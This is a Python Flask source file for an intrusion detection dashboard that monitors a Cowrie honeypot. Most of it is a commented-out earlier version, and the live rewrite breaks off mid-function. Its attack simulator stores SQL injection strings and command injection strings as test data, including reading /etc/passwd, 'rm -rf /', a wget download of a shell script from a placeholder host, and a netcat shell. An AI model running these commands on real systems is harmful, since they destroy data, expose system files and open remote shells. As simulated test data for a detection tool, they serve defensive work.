
# """
# Advanced IDS Dashboard - Main Application (Part 1/4)
# Fixed Model Switching Logic
# """

# from flask import Flask, render_template_string, jsonify, request, send_file, session, redirect, url_for
# from flask_socketio import SocketIO, emit
# import pandas as pd
# import json
# import io
# from datetime import datetime
# from collections import defaultdict
# import threading
# import time
# import random
# import os
# import joblib
# import requests
# import eventlet
# eventlet.monkey_patch()

# MODEL_DIR = os.path.join(os.getcwd(), "models")

# from integrated_ids_engine import IntegratedIDSEngine

# app = Flask(__name__)
# app.config['SECRET_KEY'] = 'your-secret-key'
# socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# # Global state
# ids_engine = None
# dashboard_start_time = datetime.now()
# initialization_complete = False
# current_model = None
# ip_blacklist = set()
# model_performance_log = []
# alert_thresholds = {
#     'confidence': 0.8,
#     'severity': 'Medium',
#     'max_failed_logins': 5
# }

# from cowrie_config import (
#     COWRIE_HOST,
#     COWRIE_USER,
#     COWRIE_KEY,
#     COWRIE_LOG_PATH
# )

# class IPEnrichment:
#     def __init__(self):
#         self.cache = {}
        
#     def get_country(self, ip: str) -> str:
#         if ip in self.cache:
#             return self.cache[ip]
        
#         try:
#             response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
#             if response.status_code == 200:
#                 data = response.json()
#                 if data.get('status') == 'success':
#                     country = data.get('countryCode', 'Unknown')
#                 else:
#                     country = 'Unknown'
#             else:
#                 country = 'Unknown'
#         except Exception as e:
#             print(f"Error looking up {ip}: {e}")
#             country = 'Unknown'
            
#         self.cache[ip] = country
#         return country


# ip_enrichment = IPEnrichment()


# class AttackSimulator:
#     """Simulates various types of attacks for testing"""
    
#     @staticmethod
#     def simulate_ddos(count=100):
#         attacks = []
#         base_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}"
#         for i in range(count):
#             attacks.append({
#                 'type': 'ddos',
#                 'src_ip': f"{base_ip}.{random.randint(1, 254)}",
#                 'dst_port': random.choice([80, 443, 8080]),
#                 'packet_count': random.randint(1000, 10000),
#                 'timestamp': datetime.now().isoformat()
#             })
#         return attacks
    
#     @staticmethod
#     def simulate_sql_injection(count=10):
#         payloads = [
#             "' OR '1'='1", "admin'--", "' UNION SELECT NULL--",
#             "1' AND 1=1--", "' DROP TABLE users--"
#         ]
#         attacks = []
#         for i in range(count):
#             attacks.append({
#                 'type': 'sql_injection',
#                 'src_ip': f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}",
#                 'payload': random.choice(payloads),
#                 'target': '/login.php',
#                 'timestamp': datetime.now().isoformat()
#             })
#         return attacks
    
#     @staticmethod
#     def simulate_brute_force(count=50):
#         usernames = ['admin', 'root', 'user', 'administrator', 'test']
#         attacks = []
#         ip = f"172.16.{random.randint(0, 255)}.{random.randint(1, 254)}"
#         for i in range(count):
#             attacks.append({
#                 'type': 'brute_force',
#                 'src_ip': ip,
#                 'username': random.choice(usernames),
#                 'password': f"pass{random.randint(1000, 9999)}",
#                 'service': 'ssh',
#                 'timestamp': datetime.now().isoformat()
#             })
#         return attacks
    
#     @staticmethod
#     def simulate_command_injection(count=15):
#         commands = [
#             '; cat /etc/passwd', '| whoami', '; rm -rf /',
#             '&& wget malicious.com/shell.sh', '; nc -e /bin/bash'
#         ]
#         attacks = []
#         for i in range(count):
#             attacks.append({
#                 'type': 'command_injection',
#                 'src_ip': f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
#                 'command': random.choice(commands),
#                 'target': '/api/exec',
#                 'timestamp': datetime.now().isoformat()
#             })
#         return attacks
    
#     @staticmethod
#     def simulate_malware_intrusion(count=20):
#         malware_types = ['trojan', 'ransomware', 'backdoor', 'rootkit', 'worm']
#         attacks = []
#         for i in range(count):
#             attacks.append({
#                 'type': 'malware_intrusion',
#                 'src_ip': f"203.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
#                 'malware_type': random.choice(malware_types),
#                 'file_hash': ''.join(random.choices('abcdef0123456789', k=32)),
#                 'timestamp': datetime.now().isoformat()
#             })
#         return attacks
    
#     @staticmethod
#     def simulate_zero_day(count=5):
#         attacks = []
#         for i in range(count):
#             attacks.append({
#                 'type': 'zero_day',
#                 'src_ip': f"45.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
#                 'exploit': f"CVE-2024-{random.randint(10000, 99999)}",
#                 'target_service': random.choice(['apache', 'nginx', 'mysql', 'redis']),
#                 'timestamp': datetime.now().isoformat()
#             })
#         return attacks
    

# """
# Advanced IDS Dashboard - API Routes (Part 2/4)
# CRITICAL FIX: Proper model switching with stats synchronization
# """

# # @app.route('/')
# # def index():
# #     from dashboard_html import DASHBOARD_HTML
# #     return render_template_string(DASHBOARD_HTML)
# import paramiko

# def test_cowrie_connection(ip, username, pem_path):
#     try:
#         print(f"🔌 Testing connection to {ip}")

#         key = paramiko.RSAKey.from_private_key_file(pem_path)

#         client = paramiko.SSHClient()
#         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#         client.connect(
#             hostname=ip,
#             username=username,
#             pkey=key,
#             timeout=10
#         )

#         client.close()
#         print("✅ Connection successful")
#         return True

#     except Exception as e:
#         print(f"❌ Connection failed: {e}")
#         return False

# @app.route('/')
# def index():
#     if not session.get('logged_in'):
#         return redirect(url_for('login'))

#     # 🚨 NEW CHECK
#     if not initialization_complete or ids_engine is None:
#         return redirect(url_for('login'))

#     from dashboard_html import DASHBOARD_HTML
#     return render_template_string(DASHBOARD_HTML)

# @app.route('/logout')
# def logout():
#     session.clear()
#     return redirect(url_for('login'))


# @app.route('/login', methods=['GET', 'POST'])
# def login():
#     if request.method == 'POST':
#         ip = request.form.get('public_ip')
#         username = request.form.get('username')
#         pem_file = request.files.get('pem_file')

#         upload_folder = "temp_keys"
#         os.makedirs(upload_folder, exist_ok=True)

#         pem_path = os.path.join(upload_folder, pem_file.filename)
#         pem_file.save(pem_path)

#         # 🚨 TRY CONNECTION FIRST
#         success = test_cowrie_connection(ip, username, pem_path)

#         if not success:
#             return "<h3 style='color:red;text-align:center;'>❌ Connection Failed. Check IP / PEM / Instance.</h3>"

#         # ✅ ONLY SET SESSION AFTER SUCCESS
#         session['logged_in'] = True
#         session['ip'] = ip
#         session['username'] = username
#         session['pem_path'] = pem_path

#         threading.Thread(
#             target=initialize_ids_with_login,
#             args=(ip, username, pem_path),
#             daemon=True
#         ).start()

#         return redirect(url_for('connecting'))

#     return """
# <html>
# <head>
#     <title>IDS Login</title>
#     <style>
#         body {
#             margin: 0;
#             font-family: 'Segoe UI', sans-serif;
#             background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
#             height: 100vh;
#             display: flex;
#             justify-content: center;
#             align-items: center;
#             color: white;
#         }

#         .container {
#             display: flex;
#             width: 850px;
#             height: 450px;
#             border-radius: 20px;
#             overflow: hidden;
#             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
#             backdrop-filter: blur(10px);
#         }

#         .left {
#             flex: 1;
#             background: linear-gradient(135deg, #00c6ff, #0072ff);
#             display: flex;
#             flex-direction: column;
#             justify-content: center;
#             padding: 40px;
#         }

#         .left h1 {
#             font-size: 32px;
#             margin-bottom: 10px;
#         }

#         .left p {
#             opacity: 0.8;
#             font-size: 14px;
#         }

#         .right {
#             flex: 1;
#             background: rgba(255,255,255,0.08);
#             backdrop-filter: blur(20px);
#             padding: 40px;
#             display: flex;
#             flex-direction: column;
#             justify-content: center;
#         }

#         h2 {
#             margin-bottom: 20px;
#             text-align: center;
#         }

#         input {
#             width: 100%;
#             padding: 12px;
#             margin-top: 12px;
#             border-radius: 10px;
#             border: none;
#             outline: none;
#             background: rgba(255,255,255,0.15);
#             color: white;
#         }

#         input::placeholder {
#             color: rgba(255,255,255,0.6);
#         }

#         input[type="file"] {
#             padding: 10px;
#             cursor: pointer;
#         }

#         button {
#             width: 100%;
#             margin-top: 20px;
#             padding: 12px;
#             border: none;
#             border-radius: 10px;
#             background: linear-gradient(135deg, #00c6ff, #0072ff);
#             color: white;
#             font-weight: bold;
#             cursor: pointer;
#             transition: 0.3s;
#         }

#         button:hover {
#             transform: scale(1.05);
#             box-shadow: 0 0 15px rgba(0,198,255,0.6);
#         }

#         .footer {
#             text-align: center;
#             margin-top: 10px;
#             font-size: 12px;
#             opacity: 0.6;
#         }
#     </style>
# </head>

# <body>

# <div class="container">

#     <div class="left">
#         <h1>🛡 IDS Dashboard</h1>
#         <p>Securely connect to your Cowrie Honeypot</p>
#         <p>Real-time monitoring • AI-powered detection • Threat intelligence</p>
#     </div>

#     <div class="right">
#         <h2>🔐 Connect Server</h2>

#         <form method="POST" enctype="multipart/form-data">
#             <input type="text" name="public_ip" placeholder="🌐 Public IP" required>
#             <input type="text" name="username" placeholder="👤 Username" required>
#             <input type="file" name="pem_file" accept=".pem" required>
#             <button type="submit">🚀 Connect & Launch IDS</button>
#         </form>

#         <div class="footer">
#             Secure SSH Connection via PEM Key
#         </div>
#     </div>

# </div>

# </body>
# </html>
# """

# @app.route('/api/status')
# def get_status():
#     return jsonify({
#         'initialized': initialization_complete,
#         'ids_active': ids_engine is not None,
#         'current_model': current_model
#     })

# @app.route('/connecting')
# def connecting():
#     return """
#     <html>
#     <head>
#         <title>Connecting...</title>
#         <script>
#             async function checkStatus() {
#                 const res = await fetch('/api/status');
#                 const data = await res.json();

#                 if (data.initialized) {
#                     window.location.href = "/";
#                 } else {
#                     setTimeout(checkStatus, 2000);
#                 }
#             }

#             window.onload = checkStatus;
#         </script>
#         <style>
#             body {
#                 background: #0a0e27;
#                 color: white;
#                 display: flex;
#                 justify-content: center;
#                 align-items: center;
#                 height: 100vh;
#                 font-family: sans-serif;
#                 flex-direction: column;
#             }

#             .spinner {
#                 width: 60px;
#                 height: 60px;
#                 border: 6px solid rgba(96,165,250,0.2);
#                 border-top: 6px solid #60a5fa;
#                 border-radius: 50%;
#                 animation: spin 1s linear infinite;
#                 margin-bottom: 20px;
#             }

#             @keyframes spin {
#                 0% { transform: rotate(0deg); }
#                 100% { transform: rotate(360deg); }
#             }
#         </style>
#     </head>

#     <body>
#         <div class="spinner"></div>
#         <h2>🔌 Connecting to Cowrie...</h2>
#         <p>Please wait while IDS initializes</p>
#     </body>
#     </html>
#     """

# @app.route('/api/models')
# def get_available_models():
#     return jsonify({
#         "models": [
#             "Random Forest",
#             "XGBoost",
#             "Decision Tree",
#             "KNN",
#             "Logistic Regression",
#             "LightGBM"
#         ],
#         "current": current_model
#     })


# @app.route('/api/models/switch', methods=['POST'])
# def switch_model():
#     """FIXED: Properly updates model name in all tracking systems"""
#     global current_model

#     data = request.get_json()
#     model_name = data.get("model_name")

#     if not ids_engine:
#         return jsonify({"success": False, "error": "IDS not initialized"}), 503

#     model_map = {
#         "Random Forest": "random_forest",
#         "XGBoost": "xgboost",
#         "Decision Tree": "decision_tree",
#         "KNN": "k-nearest_neighbors",
#         "Logistic Regression": "logistic_regression",
#         "LightGBM": "lightgbm"
#     }

#     if model_name not in model_map:
#         return jsonify({"success": False, "error": "Unsupported model"}), 400

#     model_file = model_map[model_name]
#     model_path = os.path.join(MODEL_DIR, f"{model_file}.pkl")

#     if not os.path.exists(model_path):
#         return jsonify({"success": False, "error": f"Model file missing: {model_path}"}), 500

#     try:
#         # Load the new model
#         model = joblib.load(model_path)

#         # ✅ CRITICAL FIX: Update model in engine
#         ids_engine.model = model
        
#         # ✅ CRITICAL FIX: Update model_info in engine
#         if not hasattr(ids_engine, 'model_info'):
#             ids_engine.model_info = {}
        
#         ids_engine.model_info['name'] = model_name
        
#         # ✅ CRITICAL FIX: Update global current_model
#         current_model = model_name
        
#         # ✅ CRITICAL FIX: Force update the incident tracking to use new model name
#         if hasattr(ids_engine, '_current_model_name'):
#             ids_engine._current_model_name = model_name
        
#         # Log performance change
#         model_performance_log.append({
#             'timestamp': datetime.now().isoformat(),
#             'model': model_name,
#             'action': 'switched'
#         })

#         print(f"✓ [DASHBOARD] Model switched to: {model_name}")
#         print(f"   Model path: {model_path}")
#         print(f"   Engine model_info: {ids_engine.model_info}")
#         print(f"   Global current_model: {current_model}")

#         # Notify all connected clients
#         socketio.emit("model_switched", {
#             "model": model_name,
#             "message": f"Successfully switched to {model_name}",
#             "timestamp": datetime.now().isoformat()
#         })

#         # Force immediate stats update with new model name
#         stats = ids_engine.get_stats()
#         stats['model_info']['name'] = model_name  # Force override
#         socketio.emit("stats_update", stats)

#         return jsonify({"success": True, "model": model_name})

#     except Exception as e:
#         import traceback
#         print(f"✗ Model switch error: {e}")
#         print(traceback.format_exc())
#         return jsonify({"success": False, "error": str(e)}), 500


# @app.route('/api/simulate/attack', methods=['POST'])
# def simulate_attack():
#     data = request.get_json()
#     attack_type = data.get('attack_type')
#     count = data.get('count', 10)
    
#     simulator = AttackSimulator()
#     attacks = []
    
#     if attack_type == 'ddos':
#         attacks = simulator.simulate_ddos(count)
#     elif attack_type == 'sql_injection':
#         attacks = simulator.simulate_sql_injection(count)
#     elif attack_type == 'brute_force':
#         attacks = simulator.simulate_brute_force(count)
#     elif attack_type == 'command_injection':
#         attacks = simulator.simulate_command_injection(count)
#     elif attack_type == 'malware_intrusion':
#         attacks = simulator.simulate_malware_intrusion(count)
#     elif attack_type == 'zero_day':
#         attacks = simulator.simulate_zero_day(count)
#     else:
#         return jsonify({'success': False, 'error': 'Unknown attack type'}), 400
    
#     if ids_engine and hasattr(ids_engine, 'process_simulated_attack'):
#         for attack in attacks:
#             ids_engine.process_simulated_attack(attack)
    
#     socketio.emit('simulation_started', {
#         'attack_type': attack_type,
#         'count': len(attacks),
#         'timestamp': datetime.now().isoformat()
#     })
    
#     return jsonify({
#         'success': True,
#         'attack_type': attack_type,
#         'count': len(attacks),
#         'attacks': attacks[:5]
#     })


# @app.route('/api/blacklist', methods=['GET'])
# def get_blacklist():
#     return jsonify({
#         'blacklist': list(ip_blacklist),
#         'count': len(ip_blacklist)
#     })


# @app.route('/api/blacklist/add', methods=['POST'])
# def add_to_blacklist():
#     data = request.get_json()
#     ip = data.get('ip')
    
#     if not ip:
#         return jsonify({'success': False, 'error': 'IP required'}), 400
    
#     ip_blacklist.add(ip)
    
#     socketio.emit('blacklist_updated', {
#         'action': 'added',
#         'ip': ip,
#         'count': len(ip_blacklist)
#     })
    
#     return jsonify({'success': True, 'ip': ip, 'count': len(ip_blacklist)})


# @app.route('/api/blacklist/remove', methods=['POST'])
# def remove_from_blacklist():
#     data = request.get_json()
#     ip = data.get('ip')
    
#     if ip in ip_blacklist:
#         ip_blacklist.remove(ip)
        
#         socketio.emit('blacklist_updated', {
#             'action': 'removed',
#             'ip': ip,
#             'count': len(ip_blacklist)
#         })
        
#         return jsonify({'success': True, 'ip': ip, 'count': len(ip_blacklist)})
    
#     return jsonify({'success': False, 'error': 'IP not in blacklist'}), 404


# @app.route('/api/thresholds', methods=['GET'])
# def get_thresholds():
#     return jsonify(alert_thresholds)


# @app.route('/api/thresholds/update', methods=['POST'])
# def update_thresholds():
#     data = request.get_json()
    
#     if 'confidence' in data:
#         alert_thresholds['confidence'] = float(data['confidence'])
#     if 'severity' in data:
#         alert_thresholds['severity'] = data['severity']
#     if 'max_failed_logins' in data:
#         alert_thresholds['max_failed_logins'] = int(data['max_failed_logins'])
    
#     socketio.emit('thresholds_updated', alert_thresholds)
    
#     return jsonify({'success': True, 'thresholds': alert_thresholds})


# @app.route('/api/model/performance')
# def get_model_performance():
#     if not ids_engine:
#         return jsonify([])
    
#     incidents = ids_engine.get_recent_incidents(500)
    
#     model_stats = defaultdict(lambda: {
#         'total': 0,
#         'high_confidence': 0,
#         'critical_severity': 0,
#         'avg_confidence': []
#     })
    
#     for inc in incidents:
#         model = inc.get('model_name', current_model or 'Unknown')
#         model_stats[model]['total'] += 1
        
#         if inc.get('confidence', 0) > 0.9:
#             model_stats[model]['high_confidence'] += 1
        
#         if inc.get('severity') == 'Critical':
#             model_stats[model]['critical_severity'] += 1
        
#         model_stats[model]['avg_confidence'].append(inc.get('confidence', 0))
    
#     result = []
#     for model, stats in model_stats.items():
#         avg_conf = sum(stats['avg_confidence']) / len(stats['avg_confidence']) if stats['avg_confidence'] else 0
#         result.append({
#             'model': model,
#             'total_detections': stats['total'],
#             'high_confidence_rate': (stats['high_confidence'] / stats['total'] * 100) if stats['total'] > 0 else 0,
#             'critical_rate': (stats['critical_severity'] / stats['total'] * 100) if stats['total'] > 0 else 0,
#             'avg_confidence': round(avg_conf * 100, 2)
#         })
    
#     return jsonify(result)


# @app.route('/api/top/attackers')
# def get_top_attackers():
#     if not ids_engine:
#         return jsonify([])
    
#     incidents = ids_engine.get_recent_incidents(500)
#     ip_counts = defaultdict(lambda: {'count': 0, 'severity': defaultdict(int)})
    
#     for inc in incidents:
#         ip = inc.get('src_ip', 'Unknown')
#         ip_counts[ip]['count'] += 1
#         ip_counts[ip]['severity'][inc.get('severity', 'Low')] += 1
#         if 'country' not in ip_counts[ip]:
#             ip_counts[ip]['country'] = inc.get('country', 'Unknown')
    
#     result = []
#     for ip, data in sorted(ip_counts.items(), key=lambda x: x[1]['count'], reverse=True)[:10]:
#         result.append({
#             'ip': ip,
#             'count': data['count'],
#             'country': data['country'],
#             'critical': data['severity'].get('Critical', 0),
#             'high': data['severity'].get('High', 0),
#             'is_blacklisted': ip in ip_blacklist
#         })
    
#     return jsonify(result)

# """
# Advanced IDS Dashboard - Stats & Analytics Routes (Part 3/4)
# FIXED: Always uses current_model for accurate display
# """

# @app.route('/api/stats')
# def get_stats():
#     """FIXED: Ensures model name is always current"""
#     if ids_engine is None or not initialization_complete:
#         return jsonify({
#             'initialized': False,
#             'total_events': 0,
#             'attacks_detected': 0,
#             'normal_sessions': 0,
#             'attack_rate': 0,
#             'unique_attackers': 0,
#             'uptime': '0h 0m',
#             'events_per_minute': 0,
#             'model_name': 'Loading...',
#             'model_accuracy': 0,
#             'model_f1': 0,
#             'avg_confidence': 0,
#             'model_predictions': {'attack': 0, 'normal': 0}
#         })

#     stats = ids_engine.get_stats()

#     # ✅ CRITICAL FIX: Always override with current_model
#     if 'model_info' not in stats:
#         stats['model_info'] = {}
    
#     # Use global current_model as source of truth
#     stats['model_info']['name'] = current_model or stats.get('model_info', {}).get('name', 'Unknown')

#     uptime_seconds = stats.get('uptime_seconds', 0)
#     events_per_minute = (
#         stats['total_events'] / max(uptime_seconds / 60, 1)
#         if uptime_seconds > 0 else 0
#     )

#     return jsonify({
#         'initialized': True,
#         **stats,
#         'uptime': f"{int(uptime_seconds // 3600)}h {int((uptime_seconds % 3600) // 60)}m",
#         'events_per_minute': round(events_per_minute, 2),
#         'model_name': stats['model_info']['name'],  # Now correctly reflects current_model
#         'model_accuracy': round(stats.get('model_info', {}).get('accuracy', 0) * 100, 2),
#         'model_f1': round(stats.get('model_info', {}).get('f1_score', 0) * 100, 2),
#         'blacklist_count': len(ip_blacklist)
#     })


# @app.route('/api/incidents')
# def get_incidents():
#     if ids_engine is None or not initialization_complete:
#         return jsonify([])
    
#     limit = request.args.get('limit', default=50, type=int)
#     incidents = ids_engine.get_recent_incidents(limit)
    
#     # ✅ FIX: Enrich incidents with current data
#     for incident in incidents:
#         ip = incident.get('src_ip', '')
#         if ip:
#             incident['country'] = ip_enrichment.get_country(ip)
#             incident['is_blacklisted'] = ip in ip_blacklist
        
#         # ✅ FIX: If model_name is missing, use current_model
#         if not incident.get('model_name') and current_model:
#             incident['model_name'] = current_model
    
#     return jsonify(incidents)


# @app.route('/api/attack_timeline')
# def get_attack_timeline():
#     if ids_engine is None or not initialization_complete:
#         return jsonify([])
    
#     incidents = ids_engine.get_recent_incidents(200)
#     timeline = defaultdict(int)
    
#     for incident in incidents:
#         try:
#             ts = datetime.fromisoformat(incident['timestamp'].replace('Z', '+00:00'))
#             hour_key = ts.strftime('%Y-%m-%d %H:00')
#             timeline[hour_key] += 1
#         except:
#             continue
    
#     result = [{'time': k, 'count': v} for k, v in sorted(timeline.items())]
#     return jsonify(result[-24:])


# @app.route('/api/attack_types_distribution')
# def get_attack_types():
#     if ids_engine is None or not initialization_complete:
#         return jsonify([])
    
#     stats = ids_engine.get_stats()
#     attack_types = stats.get('attack_types', {})
#     result = [{'type': k, 'count': v} for k, v in attack_types.items()]
#     return jsonify(sorted(result, key=lambda x: x['count'], reverse=True))


# @app.route('/api/severity_distribution')
# def get_severity_distribution():
#     if ids_engine is None or not initialization_complete:
#         return jsonify([])
    
#     stats = ids_engine.get_stats()
#     severity_counts = stats.get('severity_counts', {})
#     result = [{'severity': k, 'count': v} for k, v in severity_counts.items()]
#     return jsonify(result)


# @app.route('/api/confidence_distribution')
# def get_confidence_distribution():
#     if ids_engine is None or not initialization_complete:
#         return jsonify([])
    
#     incidents = ids_engine.get_recent_incidents(200)
#     buckets = {'90-100%': 0, '80-90%': 0, '70-80%': 0, '60-70%': 0, '<60%': 0}
    
#     for incident in incidents:
#         conf = incident.get('confidence', 0) * 100
#         if conf >= 90:
#             buckets['90-100%'] += 1
#         elif conf >= 80:
#             buckets['80-90%'] += 1
#         elif conf >= 70:
#             buckets['70-80%'] += 1
#         elif conf >= 60:
#             buckets['60-70%'] += 1
#         else:
#             buckets['<60%'] += 1
    
#     return jsonify([{'range': k, 'count': v} for k, v in buckets.items()])


# @app.route('/api/geo_distribution')
# def get_geo_distribution():
#     if ids_engine is None or not initialization_complete:
#         return jsonify([])
    
#     incidents = ids_engine.get_recent_incidents(500)
#     country_counts = defaultdict(int)
    
#     for incident in incidents:
#         ip = incident.get('src_ip', '')
#         if ip:
#             country = ip_enrichment.get_country(ip)
#             country_counts[country] += 1
    
#     result = [{'country': k, 'count': v} for k, v in country_counts.items()]
#     return jsonify(sorted(result, key=lambda x: x['count'], reverse=True))


# @app.route('/api/export/csv')
# def export_csv():
#     if ids_engine is None:
#         return jsonify({'error': 'IDS not initialized'}), 503
    
#     incidents = ids_engine.get_recent_incidents(1000)
#     flat_incidents = []
    
#     for inc in incidents:
#         flat_incidents.append({
#             'timestamp': inc.get('timestamp'),
#             'src_ip': inc.get('src_ip'),
#             'attack_type': inc.get('attack_type'),
#             'severity': inc.get('severity'),
#             'confidence': inc.get('confidence'),
#             'model_name': inc.get('model_name', current_model)  # Use current_model as fallback
#         })
    
#     df = pd.DataFrame(flat_incidents)
#     output = io.StringIO()
#     df.to_csv(output, index=False)
#     output.seek(0)
    
#     return send_file(
#         io.BytesIO(output.getvalue().encode()),
#         mimetype='text/csv',
#         as_attachment=True,
#         download_name=f'ids_advanced_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
#     )


# @socketio.on('connect')
# def handle_connect():
#     print('✓ Dashboard client connected')

#     emit('status', {
#         'status': 'connected',
#         'initialized': initialization_complete,
#         'current_model': current_model
#     })

#     if initialization_complete:
#         emit('initialization_complete', {
#             'status': 'ready',
#             'model': current_model
#         })

#     if ids_engine:
#         stats = ids_engine.get_stats()
#         stats['model_info']['name'] = current_model
#         emit('stats_update', stats)

#         for inc in ids_engine.get_recent_incidents(20):
#            socketio.emit('new_incident', inc, broadcast=True)


# @socketio.on('disconnect')
# def handle_disconnect():
#     print('✓ Dashboard client disconnected')


# # def broadcast_new_incident(incident):
# #     """FIXED: Ensures incidents always have current model name"""
# #     try:
# #         ip = incident.get('src_ip', '')
# #         if ip:
# #             incident['country'] = ip_enrichment.get_country(ip)
# #             incident['is_blacklisted'] = ip in ip_blacklist
        
# #         # ✅ FIX: Ensure model_name is set
# #         if not incident.get('model_name') and current_model:
# #             incident['model_name'] = current_model
        
# #         socketio.emit('new_incident', incident, broadcast=True)
# #         socketio.sleep(0)
        
# #         if ids_engine:
# #             stats = ids_engine.get_stats()
# #             # Override with current_model
# #             if 'model_info' not in stats:
# #                 stats['model_info'] = {}
# #             stats['model_info']['name'] = current_model or stats.get('model_info', {}).get('name', 'Unknown')
# #             socketio.emit('stats_update', stats)
# #     except Exception as e:
# #         print(f"Error broadcasting: {e}")


# def broadcast_new_incident(incident):
#     try:
#         ip = incident.get('src_ip', '')
#         if ip:
#             incident['country'] = ip_enrichment.get_country(ip)
#             incident['is_blacklisted'] = ip in ip_blacklist

#         if not incident.get('model_name') and current_model:
#             incident['model_name'] = current_model

#         # 🔥 FIX: force real-time push
#         socketio.emit('new_incident', incident, broadcast=True)
#         socketio.sleep(0)

#         if ids_engine:
#             stats = ids_engine.get_stats()

#             if 'model_info' not in stats:
#                 stats['model_info'] = {}

#             stats['model_info']['name'] = current_model

#             socketio.emit('stats_update', stats, broadcast=True)
#             socketio.sleep(0)

#     except Exception as e:
#         print(f"Error broadcasting: {e}")


# def initialize_ids(model_dir, model_name=None):
#     global ids_engine, initialization_complete, current_model

#     try:
#         print("\n🔧 Initializing Advanced IDS (Cowrie Integrated)...")
#         print(f"📡 Cowrie Host: {COWRIE_HOST}")

#         ids_engine = IntegratedIDSEngine(
#             COWRIE_HOST,
#             COWRIE_USER,
#             COWRIE_KEY,
#             model_dir,
#             model_name
#         )


#         ids_engine.register_alert_callback(broadcast_new_incident)

#         if ids_engine.start():
#             initialization_complete = True

#             if hasattr(ids_engine, 'model_info'):
#                 current_model = ids_engine.model_info.get('name')

#             print(f"✓ IDS initialized successfully with model: {current_model}")

#             socketio.emit('initialization_complete', {
#                 'status': 'ready',
#                 'model': current_model
#             })
#         else:
#             initialization_complete = False
#             print("❌ IDS failed to start")

#     except Exception as e:
#         import traceback
#         print(f"❌ Initialization error: {e}")
#         print(traceback.format_exc())
#         initialization_complete = False


# def initialize_ids_with_login(ip, username, pem_path):
#     global ids_engine, initialization_complete, current_model

#     try:
#         print(f"🔌 Connecting to {ip} as {username}")

#         # 🔴 RESET STATE BEFORE START
#         initialization_complete = False
#         ids_engine = None
#         current_model = None

#         # 🟢 CREATE ENGINE
#         engine = IntegratedIDSEngine(
#             ip,
#             username,
#             pem_path,
#             MODEL_DIR
#         )

#         engine.register_alert_callback(broadcast_new_incident)

#         # 🟢 START ENGINE
#         if engine.start():
#             ids_engine = engine
#             initialization_complete = True

#             if hasattr(engine, 'model_info'):
#                 current_model = engine.model_info.get('name')

#             print(f"✅ Connected successfully to {ip}")

#         else:
#             print("❌ IDS failed to start")
#             initialization_complete = False
#             ids_engine = None

#     except Exception as e:
#         print(f"❌ Initialization error: {e}")

#         initialization_complete = False
#         ids_engine = None
#         current_model = None

#     finally:
#         # 🔐 CLEANUP PEM FILE (IMPORTANT)
#         try:
#             if os.path.exists(pem_path):
#                 os.remove(pem_path)
#                 print("🧹 PEM file cleaned up")
#         except Exception as cleanup_error:
#             print(f"⚠️ PEM cleanup failed: {cleanup_error}")


# # Main entry point
# if __name__ == '__main__':
#     import sys

#     init_model = sys.argv[1] if len(sys.argv) > 1 else None


#     socketio.run(app, host='0.0.0.0', port=5000, debug=False)

"""
Advanced IDS Dashboard - Main Application
With Login, Session Management, Logout, and Live Attack Broadcasting
"""

from flask import Flask, render_template_string, jsonify, request, send_file, session, redirect, url_for
from flask_socketio import SocketIO, emit
import pandas as pd
import io
from datetime import datetime
from collections import defaultdict
import threading
import random
import os
import joblib
import requests
import paramiko
import functools

MODEL_DIR = os.path.join(os.getcwd(), "models")

from integrated_ids_engine import IntegratedIDSEngine

app = Flask(__name__)
app.config['SECRET_KEY'] = 'ids-dashboard-secret-2024'
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ─── Global State ─────────────────────────────────────────────────────────────
ids_engine = None
dashboard_start_time = datetime.now()
initialization_complete = False
current_model = None
ip_blacklist = set()
model_performance_log = []
alert_thresholds = {
    'confidence': 0.8,
    'severity': 'Medium',
    'max_failed_logins': 5
}

# ─── Login Required Decorator ─────────────────────────────────────────────────

def login_required(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

# ─── SSH Connection Test ──────────────────────────────────────────────────────

def test_cowrie_connection(ip, username, pem_path):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=ip, username=username, key_filename=pem_path, timeout=10)
        client.close()
        return True
    except Exception as e:
        print(f"SSH connection failed: {e}")
        return False

# ─── IDS Initialization (background thread) ───────────────────────────────────

def initialize_ids_with_login(ip, username, pem_path):
    global ids_engine, initialization_complete, current_model

    try:
        print(f"\n🔧 Initializing IDS for {ip}...")

        ids_engine = IntegratedIDSEngine(
            ip,
            username,
            pem_path,
            MODEL_DIR,
            None
        )

        ids_engine.register_alert_callback(broadcast_new_incident)

        if ids_engine.start():
            initialization_complete = True
            if hasattr(ids_engine, 'model_info'):
                current_model = ids_engine.model_info.get('name')
            print(f"✓ IDS initialized with model: {current_model}")
            socketio.emit('initialization_complete', {
                'status': 'ready',
                'model': current_model
            })
        else:
            initialization_complete = False
            print("❌ IDS failed to start")

    except Exception as e:
        import traceback
        print(f"❌ Init error: {e}")
        print(traceback.format_exc())
        initialization_complete = False

# ─── Background Stats Broadcaster ─────────────────────────────────────────────
# Continuously pushes stats so the dashboard stays live — same behavior as original

def stats_broadcast_loop():
    import time
    while True:
        try:
            if initialization_complete and ids_engine:
                stats = ids_engine.get_stats()
                if 'model_info' not in stats:
                    stats['model_info'] = {}
                stats['model_info']['name'] = current_model or stats.get('model_info', {}).get('name', 'Unknown')
                socketio.emit('stats_update', stats)
        except Exception as e:
            print(f"Stats broadcast error: {e}")
        time.sleep(3)

# ─── Broadcast Helper ─────────────────────────────────────────────────────────

def broadcast_new_incident(incident):
    """Called by IDS engine for every new incident — pushes to all clients instantly."""
    try:
        ip = incident.get('src_ip', '')
        if ip:
            incident['country'] = ip_enrichment.get_country(ip)
